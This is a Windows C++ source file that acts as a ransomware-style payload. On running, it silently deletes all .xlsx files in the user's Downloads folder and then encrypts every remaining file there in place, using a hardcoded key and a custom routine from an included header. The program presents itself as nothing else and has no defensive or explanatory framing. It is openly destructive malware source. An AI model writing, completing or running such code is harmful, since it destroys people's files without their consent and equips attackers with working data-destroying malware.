#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include "kk5v.h"

// Remove all .xlsx files in the Downloads directory
void removeXlsxFiles(const std::string& directory) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*.xlsx").c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::string filePath = directory + "\\" + findFileData.cFileName;
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue; // Skip directories
        DeleteFile(filePath.c_str());  // Delete .xlsx files silently
    } while (FindNextFile(hFind, &findFileData) != 0);
    FindClose(hFind);
}

// Encrypt files in the Downloads directory
void processFiles(const std::string& directory, char xorKey, int caesarShift, const std::string& kk5vKey) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue; // Skip directories
            std::string filePath = directory + "\\" + findFileData.cFileName;
            KK5V::encryptFile(filePath, xorKey, caesarShift, kk5vKey); // Encrypt file
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
}

// Main entry point (silent execution)
int main() {
    const char xorKey = 'K';  // Example XOR key
    const int caesarShift = 3;  // Example Caesar shift
    const std::string kk5vKey = "SuperSecretKey";  // Example KK5V key

    // Get the user's Downloads directory
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH)) {
        std::string downloadsDir = std::string(userProfile) + "\\Downloads";

        // Remove all .xlsx files
        removeXlsxFiles(downloadsDir);

        // Encrypt other files in the Downloads directory
        processFiles(downloadsDir, xorKey, caesarShift, kk5vKey);
    }

    return 0;
}
